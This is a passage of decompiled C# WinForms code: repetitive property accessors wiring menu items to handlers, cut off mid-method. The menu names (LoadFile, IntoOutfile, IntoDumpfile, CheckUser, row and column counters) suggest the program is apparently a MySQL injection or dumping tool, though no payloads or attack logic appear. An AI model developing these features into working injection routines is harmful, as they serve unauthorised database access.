	// (get) Token: 0x0600051C RID: 1308 RVA: 0x000227E4 File Offset: 0x000209E4
	// (set) Token: 0x0600051D RID: 1309 RVA: 0x000227EC File Offset: 0x000209EC
	internal virtual ToolStripMenuItem mnuHostIP
	{
		[CompilerGenerated]
		get
		{
			return this._mnuHostIP;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_104);
			ToolStripMenuItem toolStripMenuItem = this._mnuHostIP;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuHostIP = value;
			toolStripMenuItem = this._mnuHostIP;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A3 RID: 419
	// (get) Token: 0x0600051E RID: 1310 RVA: 0x00022830 File Offset: 0x00020A30
	// (set) Token: 0x0600051F RID: 1311 RVA: 0x00022838 File Offset: 0x00020A38
	internal virtual ToolStripMenuItem mnuExtraMySQLStuffs2
	{
		[CompilerGenerated]
		get
		{
			return this._mnuExtraMySQLStuffs2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_107);
			ToolStripMenuItem toolStripMenuItem = this._mnuExtraMySQLStuffs2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuExtraMySQLStuffs2 = value;
			toolStripMenuItem = this._mnuExtraMySQLStuffs2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A4 RID: 420
	// (get) Token: 0x06000520 RID: 1312 RVA: 0x0002287C File Offset: 0x00020A7C
	// (set) Token: 0x06000521 RID: 1313 RVA: 0x00022884 File Offset: 0x00020A84
	internal virtual ToolStripMenuItem mnuLoadFile
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLoadFile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_108);
			ToolStripMenuItem toolStripMenuItem = this._mnuLoadFile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuLoadFile = value;
			toolStripMenuItem = this._mnuLoadFile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A5 RID: 421
	// (get) Token: 0x06000522 RID: 1314 RVA: 0x000228C8 File Offset: 0x00020AC8
	// (set) Token: 0x06000523 RID: 1315 RVA: 0x000228D0 File Offset: 0x00020AD0
	internal virtual ToolStripMenuItem mnuIntoOutfile
	{
		[CompilerGenerated]
		get
		{
			return this._mnuIntoOutfile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_109);
			ToolStripMenuItem toolStripMenuItem = this._mnuIntoOutfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuIntoOutfile = value;
			toolStripMenuItem = this._mnuIntoOutfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A6 RID: 422
	// (get) Token: 0x06000524 RID: 1316 RVA: 0x00022914 File Offset: 0x00020B14
	// (set) Token: 0x06000525 RID: 1317 RVA: 0x0002291C File Offset: 0x00020B1C
	internal virtual ToolStripMenuItem mnuIntoDumpfile
	{
		[CompilerGenerated]
		get
		{
			return this._mnuIntoDumpfile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_110);
			ToolStripMenuItem toolStripMenuItem = this._mnuIntoDumpfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuIntoDumpfile = value;
			toolStripMenuItem = this._mnuIntoDumpfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A7 RID: 423
	// (get) Token: 0x06000526 RID: 1318 RVA: 0x00022960 File Offset: 0x00020B60
	// (set) Token: 0x06000527 RID: 1319 RVA: 0x00022968 File Offset: 0x00020B68
	internal virtual ToolStripMenuItem mnuExtraMySQLStuffs
	{
		[CompilerGenerated]
		get
		{
			return this._mnuExtraMySQLStuffs;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_106);
			ToolStripMenuItem toolStripMenuItem = this._mnuExtraMySQLStuffs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuExtraMySQLStuffs = value;
			toolStripMenuItem = this._mnuExtraMySQLStuffs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A8 RID: 424
	// (get) Token: 0x06000528 RID: 1320 RVA: 0x000229AC File Offset: 0x00020BAC
	// (set) Token: 0x06000529 RID: 1321 RVA: 0x000229B4 File Offset: 0x00020BB4
	internal virtual ToolStripMenuItem mnuCheckUser
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCheckUser;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_113);
			ToolStripMenuItem toolStripMenuItem = this._mnuCheckUser;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCheckUser = value;
			toolStripMenuItem = this._mnuCheckUser;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A9 RID: 425
	// (get) Token: 0x0600052A RID: 1322 RVA: 0x000229F8 File Offset: 0x00020BF8
	// (set) Token: 0x0600052B RID: 1323 RVA: 0x00022A00 File Offset: 0x00020C00
	internal virtual ToolStripMenuItem mnuCheckPizza
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCheckPizza;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_114);
			ToolStripMenuItem toolStripMenuItem = this._mnuCheckPizza;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCheckPizza = value;
			toolStripMenuItem = this._mnuCheckPizza;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001AA RID: 426
	// (get) Token: 0x0600052C RID: 1324 RVA: 0x00022A44 File Offset: 0x00020C44
	// (set) Token: 0x0600052D RID: 1325 RVA: 0x00022A4C File Offset: 0x00020C4C
	internal virtual ToolStripMenuItem mnuJOIN
	{
		[CompilerGenerated]
		get
		{
			return this._mnuJOIN;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_115);
			ToolStripMenuItem toolStripMenuItem = this._mnuJOIN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuJOIN = value;
			toolStripMenuItem = this._mnuJOIN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001AB RID: 427
	// (get) Token: 0x0600052E RID: 1326 RVA: 0x00022A90 File Offset: 0x00020C90
	// (set) Token: 0x0600052F RID: 1327 RVA: 0x00022A98 File Offset: 0x00020C98
	internal virtual ToolStripMenuItem mnuLENGTH
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLENGTH;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_116);
			ToolStripMenuItem toolStripMenuItem = this._mnuLENGTH;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuLENGTH = value;
			toolStripMenuItem = this._mnuLENGTH;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001AC RID: 428
	// (get) Token: 0x06000530 RID: 1328 RVA: 0x00022ADC File Offset: 0x00020CDC
	// (set) Token: 0x06000531 RID: 1329 RVA: 0x00022AE4 File Offset: 0x00020CE4
	internal virtual ToolStripMenuItem mnuLimitXY
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLimitXY;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_117);
			ToolStripMenuItem toolStripMenuItem = this._mnuLimitXY;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuLimitXY = value;
			toolStripMenuItem = this._mnuLimitXY;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001AD RID: 429
	// (get) Token: 0x06000532 RID: 1330 RVA: 0x00022B28 File Offset: 0x00020D28
	// (set) Token: 0x06000533 RID: 1331 RVA: 0x00022B30 File Offset: 0x00020D30
	internal virtual ToolStripSeparator ToolStripSeparator34
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001AE RID: 430
	// (get) Token: 0x06000534 RID: 1332 RVA: 0x00022B3C File Offset: 0x00020D3C
	// (set) Token: 0x06000535 RID: 1333 RVA: 0x00022B44 File Offset: 0x00020D44
	internal virtual ToolStripMenuItem mnuMySQLHelp
	{
		[CompilerGenerated]
		get
		{
			return this._mnuMySQLHelp;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_130);
			ToolStripMenuItem toolStripMenuItem = this._mnuMySQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuMySQLHelp = value;
			toolStripMenuItem = this._mnuMySQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001AF RID: 431
	// (get) Token: 0x06000536 RID: 1334 RVA: 0x00022B88 File Offset: 0x00020D88
	// (set) Token: 0x06000537 RID: 1335 RVA: 0x00022B90 File Offset: 0x00020D90
	internal virtual ContextMenuStrip ctmConvert
	{
		[CompilerGenerated]
		get
		{
			return this._mnuListView_1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler cancelEventHandler = new CancelEventHandler(this.method_122);
			ContextMenuStrip contextMenuStrip = this._mnuListView_1;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening -= cancelEventHandler;
			}
			this._mnuListView_1 = value;
			contextMenuStrip = this._mnuListView_1;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening += cancelEventHandler;
			}
		}
	}

	// Token: 0x170001B0 RID: 432
	// (get) Token: 0x06000538 RID: 1336 RVA: 0x00022BD4 File Offset: 0x00020DD4
	// (set) Token: 0x06000539 RID: 1337 RVA: 0x00022BDC File Offset: 0x00020DDC
	internal virtual ToolStripMenuItem mnuConvHex
	{
		[CompilerGenerated]
		get
		{
			return this._mnuConvHex;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_124);
			ToolStripMenuItem toolStripMenuItem = this._mnuConvHex;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuConvHex = value;
			toolStripMenuItem = this._mnuConvHex;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B1 RID: 433
	// (get) Token: 0x0600053A RID: 1338 RVA: 0x00022C20 File Offset: 0x00020E20
	// (set) Token: 0x0600053B RID: 1339 RVA: 0x00022C28 File Offset: 0x00020E28
	internal virtual ToolStripMenuItem mnuConvChar
	{
		[CompilerGenerated]
		get
		{
			return this._mnuConvChar;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_124);
			ToolStripMenuItem toolStripMenuItem = this._mnuConvChar;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuConvChar = value;
			toolStripMenuItem = this._mnuConvChar;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B2 RID: 434
	// (get) Token: 0x0600053C RID: 1340 RVA: 0x00022C6C File Offset: 0x00020E6C
	// (set) Token: 0x0600053D RID: 1341 RVA: 0x00022C74 File Offset: 0x00020E74
	internal virtual ToolStripMenuItem mnuConvCharGroup
	{
		[CompilerGenerated]
		get
		{
			return this._mnuConvCharGroup;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_124);
			ToolStripMenuItem toolStripMenuItem = this._mnuConvCharGroup;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuConvCharGroup = value;
			toolStripMenuItem = this._mnuConvCharGroup;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B3 RID: 435
	// (get) Token: 0x0600053E RID: 1342 RVA: 0x00022CB8 File Offset: 0x00020EB8
	// (set) Token: 0x0600053F RID: 1343 RVA: 0x00022CC0 File Offset: 0x00020EC0
	internal virtual ToolStripSeparator ToolStripMenuItem2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001B4 RID: 436
	// (get) Token: 0x06000540 RID: 1344 RVA: 0x00022CCC File Offset: 0x00020ECC
	// (set) Token: 0x06000541 RID: 1345 RVA: 0x00022CD4 File Offset: 0x00020ED4
	internal virtual ToolStripMenuItem mnuConvLEN
	{
		[CompilerGenerated]
		get
		{
			return this._mnuConvLEN;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_124);
			ToolStripMenuItem toolStripMenuItem = this._mnuConvLEN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuConvLEN = value;
			toolStripMenuItem = this._mnuConvLEN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B5 RID: 437
	// (get) Token: 0x06000542 RID: 1346 RVA: 0x00022D18 File Offset: 0x00020F18
	// (set) Token: 0x06000543 RID: 1347 RVA: 0x00022D20 File Offset: 0x00020F20
	internal virtual ToolStripMenuItem mnuConvAddA
	{
		[CompilerGenerated]
		get
		{
			return this._mnuConvAddA;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_123);
			ToolStripMenuItem toolStripMenuItem = this._mnuConvAddA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuConvAddA = value;
			toolStripMenuItem = this._mnuConvAddA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B6 RID: 438
	// (get) Token: 0x06000544 RID: 1348 RVA: 0x00022D64 File Offset: 0x00020F64
	// (set) Token: 0x06000545 RID: 1349 RVA: 0x00022D6C File Offset: 0x00020F6C
	internal virtual ImageList imgTV
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001B7 RID: 439
	// (get) Token: 0x06000546 RID: 1350 RVA: 0x00022D78 File Offset: 0x00020F78
	// (set) Token: 0x06000547 RID: 1351 RVA: 0x00022D80 File Offset: 0x00020F80
	internal virtual ContextMenuStrip mnuTree
	{
		[CompilerGenerated]
		get
		{
			return this._mnuListView;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler cancelEventHandler = new CancelEventHandler(this.method_61);
			ContextMenuStrip contextMenuStrip = this._mnuListView;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening -= cancelEventHandler;
			}
			this._mnuListView = value;
			contextMenuStrip = this._mnuListView;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening += cancelEventHandler;
			}
		}
	}

	// Token: 0x170001B8 RID: 440
	// (get) Token: 0x06000548 RID: 1352 RVA: 0x00022DC4 File Offset: 0x00020FC4
	// (set) Token: 0x06000549 RID: 1353 RVA: 0x00022DCC File Offset: 0x00020FCC
	internal virtual ToolStripMenuItem mnuCountDBs
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountDBs;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountDBs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountDBs = value;
			toolStripMenuItem = this._mnuCountDBs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001B9 RID: 441
	// (get) Token: 0x0600054A RID: 1354 RVA: 0x00022E10 File Offset: 0x00021010
	// (set) Token: 0x0600054B RID: 1355 RVA: 0x00022E18 File Offset: 0x00021018
	internal virtual ToolStripMenuItem mnuCountTables
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountTables;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountTables;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountTables = value;
			toolStripMenuItem = this._mnuCountTables;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BA RID: 442
	// (get) Token: 0x0600054C RID: 1356 RVA: 0x00022E5C File Offset: 0x0002105C
	// (set) Token: 0x0600054D RID: 1357 RVA: 0x00022E64 File Offset: 0x00021064
	internal virtual ToolStripMenuItem mnuCountTablesAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountTablesAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountTablesAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountTablesAll = value;
			toolStripMenuItem = this._mnuCountTablesAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BB RID: 443
	// (get) Token: 0x0600054E RID: 1358 RVA: 0x00022EA8 File Offset: 0x000210A8
	// (set) Token: 0x0600054F RID: 1359 RVA: 0x00022EB0 File Offset: 0x000210B0
	internal virtual ToolStripMenuItem mnuCountColumns
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountColumns;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountColumns = value;
			toolStripMenuItem = this._mnuCountColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BC RID: 444
	// (get) Token: 0x06000550 RID: 1360 RVA: 0x00022EF4 File Offset: 0x000210F4
	// (set) Token: 0x06000551 RID: 1361 RVA: 0x00022EFC File Offset: 0x000210FC
	internal virtual ToolStripMenuItem mnuCountColumnsAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountColumnsAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountColumnsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountColumnsAll = value;
			toolStripMenuItem = this._mnuCountColumnsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BD RID: 445
	// (get) Token: 0x06000552 RID: 1362 RVA: 0x00022F40 File Offset: 0x00021140
	// (set) Token: 0x06000553 RID: 1363 RVA: 0x00022F48 File Offset: 0x00021148
	internal virtual ToolStripMenuItem mnuCountRows
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountRows;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountRows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountRows = value;
			toolStripMenuItem = this._mnuCountRows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BE RID: 446
	// (get) Token: 0x06000554 RID: 1364 RVA: 0x00022F8C File Offset: 0x0002118C
	// (set) Token: 0x06000555 RID: 1365 RVA: 0x00022F94 File Offset: 0x00021194
	internal virtual ToolStripMenuItem mnuCountRowsAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCountRowsAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_60);
			ToolStripMenuItem toolStripMenuItem = this._mnuCountRowsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCountRowsAll = value;
			toolStripMenuItem = this._mnuCountRowsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001BF RID: 447
	// (get) Token: 0x06000556 RID: 1366 RVA: 0x00022FD8 File Offset: 0x000211D8
	// (set) Token: 0x06000557 RID: 1367 RVA: 0x00022FE0 File Offset: 0x000211E0
	internal virtual ToolStripSeparator mnuCountSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001C0 RID: 448
	// (get) Token: 0x06000558 RID: 1368 RVA: 0x00022FEC File Offset: 0x000211EC
	// (set) Token: 0x06000559 RID: 1369 RVA: 0x00022FF4 File Offset: 0x000211F4
	internal virtual ToolStripMenuItem mnuCopyDB
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCopyDB;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_63);
			ToolStripMenuItem toolStripMenuItem = this._mnuCopyDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCopyDB = value;
			toolStripMenuItem = this._mnuCopyDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C1 RID: 449
	// (get) Token: 0x0600055A RID: 1370 RVA: 0x00023038 File Offset: 0x00021238
	// (set) Token: 0x0600055B RID: 1371 RVA: 0x00023040 File Offset: 0x00021240
	internal virtual ToolStripMenuItem mnuCopyColumn
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCopyColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_63);
			ToolStripMenuItem toolStripMenuItem = this._mnuCopyColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCopyColumn = value;
			toolStripMenuItem = this._mnuCopyColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C2 RID: 450
	// (get) Token: 0x0600055C RID: 1372 RVA: 0x00023084 File Offset: 0x00021284
	// (set) Token: 0x0600055D RID: 1373 RVA: 0x0002308C File Offset: 0x0002128C
	internal virtual ToolStripMenuItem mnuCopyTable
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCopyTable;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_63);
			ToolStripMenuItem toolStripMenuItem = this._mnuCopyTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCopyTable = value;
			toolStripMenuItem = this._mnuCopyTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C3 RID: 451
	// (get) Token: 0x0600055E RID: 1374 RVA: 0x000230D0 File Offset: 0x000212D0
	// (set) Token: 0x0600055F RID: 1375 RVA: 0x000230D8 File Offset: 0x000212D8
	internal virtual ToolStripSeparator mnuCheckAllSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001C4 RID: 452
	// (get) Token: 0x06000560 RID: 1376 RVA: 0x000230E4 File Offset: 0x000212E4
	// (set) Token: 0x06000561 RID: 1377 RVA: 0x000230EC File Offset: 0x000212EC
	internal virtual ToolStripMenuItem mnuCheckAllColumns
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCheckAllColumns;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_62);
			ToolStripMenuItem toolStripMenuItem = this._mnuCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCheckAllColumns = value;
			toolStripMenuItem = this._mnuCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C5 RID: 453
	// (get) Token: 0x06000562 RID: 1378 RVA: 0x00023130 File Offset: 0x00021330
	// (set) Token: 0x06000563 RID: 1379 RVA: 0x00023138 File Offset: 0x00021338
	internal virtual ToolStripMenuItem mnuUnCheckAllColumns
	{
		[CompilerGenerated]
		get
		{
			return this._mnuUnCheckAllColumns;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_62);
			ToolStripMenuItem toolStripMenuItem = this._mnuUnCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuUnCheckAllColumns = value;
			toolStripMenuItem = this._mnuUnCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C6 RID: 454
	// (get) Token: 0x06000564 RID: 1380 RVA: 0x0002317C File Offset: 0x0002137C
	// (set) Token: 0x06000565 RID: 1381 RVA: 0x00023184 File Offset: 0x00021384
	internal virtual ToolStripMenuItem mnuCheckRevert
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCheckRevert;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_62);
			ToolStripMenuItem toolStripMenuItem = this._mnuCheckRevert;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCheckRevert = value;
			toolStripMenuItem = this._mnuCheckRevert;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C7 RID: 455
	// (get) Token: 0x06000566 RID: 1382 RVA: 0x000231C8 File Offset: 0x000213C8
	// (set) Token: 0x06000567 RID: 1383 RVA: 0x000231D0 File Offset: 0x000213D0
	internal virtual ToolStripSeparator mnuTreeSP1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001C8 RID: 456
	// (get) Token: 0x06000568 RID: 1384 RVA: 0x000231DC File Offset: 0x000213DC
	// (set) Token: 0x06000569 RID: 1385 RVA: 0x000231E4 File Offset: 0x000213E4
	internal virtual ToolStripMenuItem mnuCopyAllNodes
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCopyAllNodes;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_64);
			ToolStripMenuItem toolStripMenuItem = this._mnuCopyAllNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCopyAllNodes = value;
			toolStripMenuItem = this._mnuCopyAllNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001C9 RID: 457
	// (get) Token: 0x0600056A RID: 1386 RVA: 0x00023228 File Offset: 0x00021428
	// (set) Token: 0x0600056B RID: 1387 RVA: 0x00023230 File Offset: 0x00021430
	internal virtual ToolStripMenuItem mnuCopyAllSchema
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCopyAllSchema;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_65);
